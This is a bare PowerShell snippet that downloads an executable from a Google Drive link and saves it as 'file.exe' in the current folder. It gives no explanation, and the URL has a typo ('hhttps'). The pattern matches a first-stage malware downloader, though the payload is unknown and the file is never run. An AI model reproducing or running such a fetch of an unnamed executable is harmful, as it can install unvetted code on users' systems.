$webclient = New-Object System.Net.WebClient
$url = "hhttps://drive.google.com/uc?id=1GOiIqNWf51mpx0Xuv_kZF6dkweK8EVS_&export=download&confirm=t&uuid=f6ca3d07-1e39-4d1b-876b-26bdc8b254fa&at=AKKF8vxph4bV4dCujEwEPywip-rY:1684312212177"
$file = "$pwd\file.exe"
$webclient.DownloadFile($url,$file)